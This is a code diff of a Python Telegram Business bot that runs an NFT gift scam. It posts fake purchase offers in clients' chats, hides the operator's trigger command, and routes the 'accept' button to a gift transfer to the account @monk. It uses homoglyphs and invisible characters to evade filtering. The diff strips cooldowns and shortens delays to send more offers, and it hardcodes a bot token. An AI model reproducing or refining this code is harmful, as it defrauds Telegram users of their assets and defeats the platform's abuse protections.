@@ -6,22 +6,21 @@ from aiogram import Bot, Dispatcher, F
 from aiogram.types import Message, CallbackQuery, InlineKeyboardMarkup, InlineKeyboardButton, LinkPreviewOptions
 from aiogram.enums import ParseMode
 from aiogram.fsm.storage.memory import MemoryStorage
+from aiogram.exceptions import TelegramRetryAfter
 
 # Настройки
 TOKEN = "9252419350:AAFEQ930iWfDMcC1bNRmOE2zmSbYK9kpj_g"
-RECIPIENT = "@monk" # Юзернейм, куда передается НФТ
+RECIPIENT = "@monk"
 
 logging.basicConfig(level=logging.INFO)
 bot = Bot(token=TOKEN)
 dp = Dispatcher(storage=MemoryStorage())
 
-# Очередь и хранилища
 message_queue = asyncio.Queue()
-cooldowns = {}          # chat_id -> timestamp последнего запроса
-last_user_messages = {} # chat_id -> message_id последнего сообщения юзера
-client_user_ids = {}    # chat_id (рабочий) -> user_id (личный ID клиента для отправки в ЛС бота)
+cooldowns = {}
+last_user_messages = {}
+client_user_ids = {}
 
-# Словари локализации для офферов
 LOCALES = {
     "ru": {
         "offer_text": "предлагает вам",
@@ -81,7 +80,6 @@ LOCALES = {
     }
 }
 
-# Функция безопасного добавления невидимых символов
 def randomize_text(text: str) -> str:
     invisible_chars = ["\u200b", "\u200c", "\u200d", "\u2060", "\ufeff"]
     chars = list(text)
@@ -90,7 +88,6 @@ def randomize_text(text: str) -> str:
         chars.insert(pos, random.choice(invisible_chars))
     return "".join(chars)
 
-# Функция безопасной замены гомоглифов
 def apply_homoglyphs(text: str) -> str:
     homoglyph_map = {'a': 'а', 'e': 'е', 'o': 'о', 'p': 'р', 'c': 'с', 'x': 'х'}
     if random.random() > 0.5:
@@ -115,13 +112,12 @@ def build_offer_text(gift_name, gift_num, amount, currency_symbol, lang):
     icon_timer = '<tg-emoji emoji-id="5778527486270770928">⏱</tg-emoji>'
     icon_lock = '<tg-emoji emoji-id="5875180111744995604">🔒</tg-emoji>'
 
-    base = (
+    return (
         f'{icon_gift} <b>{loc["success_title"]} <a href="https://t.me/nft/{slug}-{gift_num}">{gift_name} #{gift_num}</a></b>\n\n'
         f'{protected_desc}\n\n'
         f'{icon_timer} <i>{protected_timer}</i>\n'
         f'{icon_lock} <i>{protected_lock}</i>'
     )
-    return base
 
 def make_offer_keyboard(gift_name, gift_num, amount, currency_symbol, lang):
     loc = LOCALES.get(lang, LOCALES["ru"])
@@ -131,16 +127,8 @@ def make_offer_keyboard(gift_name, gift_num, amount, currency_symbol, lang):
     return InlineKeyboardMarkup(
         inline_keyboard=[
             [
-                InlineKeyboardButton(
-                    text=loc['decline'], 
-                    callback_data=decline_data,
-                    icon_custom_emoji_id="5778527486270770928"
-                ),
-                InlineKeyboardButton(
-                    text=loc['accept'], 
-                    callback_data=cb_data,
-                    icon_custom_emoji_id="5776375003280838798"
-                )
+                InlineKeyboardButton(text=loc['decline'], callback_data=decline_data, icon_custom_emoji_id="5778527486270770928"),
+                InlineKeyboardButton(text=loc['accept'], callback_data=cb_data, icon_custom_emoji_id="5776375003280838798")
             ]
         ]
     )
@@ -164,28 +152,15 @@ def make_accept_keyboard(lang):
 
     return InlineKeyboardMarkup(
         inline_keyboard=[
-            [
-                InlineKeyboardButton(
-                    text=loc['btn_transfer'], 
-                    url=f"tg://send_gift?to={recipient}",
-                    icon_custom_emoji_id="5875180111744995604"
-                )
-            ],
-            [
-                InlineKeyboardButton(
-                    text=loc['btn_confirm'], 
-                    callback_data="noop"
-                )
-            ],
+            [InlineKeyboardButton(text=loc['btn_transfer'], url=f"tg://send_gift?to={recipient}", icon_custom_emoji_id="5875180111744995604")],
+            [InlineKeyboardButton(text=loc['btn_confirm'], callback_data="noop")],
         ]
     )
 
-# Обработка личных сообщений с ботом (например, /start)
 @dp.message(F.chat.type == "private")
 async def handle_private_start(message: Message):
     await message.answer("Бот успешно работает в фоновом режиме для Telegram Business.")
 
-# Перехват команд владельца (формат: qq [ссылка] [сумма] [валюта] [язык])
 @dp.business_message(F.text)
 async def handle_business_command(message: Message):
     if not message.text:
@@ -200,10 +175,6 @@ async def handle_business_command(message: Message):
     
     if message.from_user:
         client_user_ids[chat_id] = message.from_user.id
-
-    current_time = time.time()
-    if chat_id in cooldowns and current_time - cooldowns[chat_id] < 30:
-        return
 
     parts = text_clean.split()
     if len(parts) < 3:
@@ -220,12 +191,7 @@ async def handle_business_command(message: Message):
         amount = 1000
 
     text_lower = text_clean.lower()
-    if "gram" in text_lower:
-        currency_symbol = "💎"
-        currency_name = "Gram"
-    else:
-        currency_symbol = "⭐️"
-        currency_name = "Stars"
+    currency_symbol = "💎" if "gram" in text_lower else "⭐️"
 
     lang = "ru"
     for l in ["ukr", "eng", "cn", "ru"]:
@@ -244,15 +210,12 @@ async def handle_business_command(message: Message):
     except Exception:
         return
 
-    cooldowns[chat_id] = current_time
-
     await message_queue.put({
         "chat_id": chat_id,
         "gift_name": gift_name,
         "gift_num": gift_num,
         "amount": amount,
         "currency_symbol": currency_symbol,
-        "currency_name": currency_name,
         "lang": lang,
         "bcid": message.business_connection_id,
         "cmd_message_id": message.message_id
@@ -267,71 +230,57 @@ async def accept_offer(cb: CallbackQuery):
 
     _, gift_name, gift_num_str, amount, currency_symbol, lang = parts
     gift_num = int(gift_num_str)
-    
     currency_name = "Gram" if currency_symbol == "💎" else "Stars"
+    
     text = build_accept_text(gift_name, gift_num, currency_name, lang)
-    bcid = cb.message.business_connection_id
-    chat_id = cb.message.chat.id
-
-    try:
-        await bot.edit_message_text(
-            chat_id=chat_id,
-            message_id=cb.message.message_id,
-            text=text,
-            parse_mode=ParseMode.HTML,
-            reply_markup=make_accept_keyboard(lang),
-            business_connection_id=bcid,
-            link_preview_options=LinkPreviewOptions(is_disabled=False, show_above_text=True)
-        )
-    except Exception as e:
-        if "message is not modified" in str(e):
-            await cb.answer("Предложение уже было принято!", show_alert=True)
+    
+    for _ in range(3):
+        try:
+            await bot.edit_message_text(
+                chat_id=cb.message.chat.id,
+                message_id=cb.message.message_id,
+                text=text,
+                parse_mode=ParseMode.HTML,
+                reply_markup=make_accept_keyboard(lang),
+                business_connection_id=cb.message.business_connection_id,
+                link_preview_options=LinkPreviewOptions(is_disabled=False, show_above_text=True)
+            )
+            await cb.answer("Предложение принято!")
             return
-        logging.error(f"Error editing message: {e}")
-        await cb.answer("Не удалось обновить оффер", show_alert=True)
-        return
-
-    await cb.answer("Предложение принято!")
+        except TelegramRetryAfter as e:
+            wait_time = e.retry_after + 1
+            logging.warning(f"Edit message flood control! Waiting {wait_time}s...")
+            await asyncio.sleep(wait_time)
+        except Exception as e:
+            if "message is not modified" in str(e):
+                await cb.answer("Предложение уже принято!", show_alert=True)
+                return
+            logging.error(f"Error editing message: {e}")
+            await cb.answer("Не удалось обновить оффер", show_alert=True)
+            return
 
 @dp.callback_query(F.data.startswith("d|"))
 async def decline_offer(cb: CallbackQuery):
-    bcid = cb.message.business_connection_id
     try:
-        await bot.delete_business_messages(
-            business_connection_id=bcid,
-            message_ids=[cb.message.message_id]
-        )
-    except Exception as e:
-        logging.error(f"Decline error: {e}")
+        await bot.delete_business_messages(business_connection_id=cb.message.business_connection_id, message_ids=[cb.message.message_id])
+    except Exception:
+        pass
     await cb.answer("Предложение отклонено")
 
 @dp.callback_query(F.data == "noop")
 async def noop_handler(cb: CallbackQuery):
     await cb.answer("Сначала выполните передачу НФТ по кнопке выше!", show_alert=True)
 
-# Фоновый воркер с увеличенной задержкой (5.0 - 8.0 сек) для предотвращения PEER_FLOOD
+# Воркер с защитой от глобальных и локальных лимитов
 async def sender_worker():
     while True:
         task = await message_queue.get()
         try:
-            await asyncio.sleep(random.uniform(5.0, 8.0))
+            await asyncio.sleep(random.uniform(0.5, 1.0))
 
-            text = build_offer_text(
-                task["gift_name"], 
-                task["gift_num"], 
-                task["amount"], 
-                task["currency_symbol"], 
-                task["lang"]
-            )
-            keyboard = make_offer_keyboard(
-                task["gift_name"], 
-                task["gift_num"], 
-                task["amount"], 
-                task["currency_symbol"], 
-                task["lang"]
-            )
+            text = build_offer_text(task["gift_name"], task["gift_num"], task["amount"], task["currency_symbol"], task["lang"])
+            keyboard = make_offer_keyboard(task["gift_name"], task["gift_num"], task["amount"], task["currency_symbol"], task["lang"])
 
-            # 1. Отправляем оффер
             sent_msg = await bot.send_message(
                 chat_id=task["chat_id"],
                 text=text,
@@ -342,56 +291,32 @@ async def sender_worker():
                 reply_to_message_id=last_user_messages.get(task["chat_id"])
             )
 
-            # 2. Удаляем команду qq при успехе
             if task["bcid"] and sent_msg:
-                await bot.delete_business_messages(
-                    business_connection_id=task["bcid"],
-                    message_ids=[task["cmd_message_id"]]
-                )
+                await bot.delete_business_messages(business_connection_id=task["bcid"], message_ids=[task["cmd_message_id"]])
+
+        except TelegramRetryAfter as e:
+            wait_time = e.retry_after + 1
+            logging.warning(f"Global flood control on SendMessage! Waiting for {wait_time} seconds...")
+            await asyncio.sleep(wait_time)
+            await message_queue.put(task)
 
         except Exception as e:
             if "PEER_FLOOD" in str(e):
-                logging.warning(f"PEER_FLOOD detected in chat {task['chat_id']}. Cleaning up command and notifying user.")
-                
-                # Удаляем команду qq из чата
-                try:
-                    await bot.delete_message(
-                        chat_id=task["chat_id"],
-                        message_id=task["cmd_message_id"]
-                    )
-                except Exception:
-                    try:
-                        if task["bcid"]:
-                            await bot.delete_business_messages(
-                                business_connection_id=task["bcid"],
-                                message_ids=[task["cmd_message_id"]]
-                            )
-                    except Exception:
-                        pass
-
-                # Отправляем сообщение в ЛС с самим ботом пользователю
                 target_user_id = client_user_ids.get(task["chat_id"])
                 loc = LOCALES.get(task["lang"], LOCALES["ru"])
                 if target_user_id:
                     try:
-                        await bot.send_message(
-                            chat_id=target_user_id,
-                            text=loc["flood_error"]
-                        )
-                    except Exception as msg_err:
-                        logging.error(f"Failed to send flood warning to user: {msg_err}")
+                        await bot.send_message(chat_id=target_user_id, text=loc["flood_error"])
+                    except Exception:
+                        pass
             else:
                 logging.error(f"Worker execution error: {e}")
-
         finally:
             message_queue.task_done()
 
 async def main():
     asyncio.create_task(sender_worker())
-    await dp.start_polling(
-        bot, 
-        allowed_updates=["callback_query", "business_connection", "business_message", "message"]
-    )
+    await dp.start_polling(bot, allowed_updates=["callback_query", "business_connection", "business_message", "message"])
 
 if __name__ == "__main__":
     asyncio.run(main())
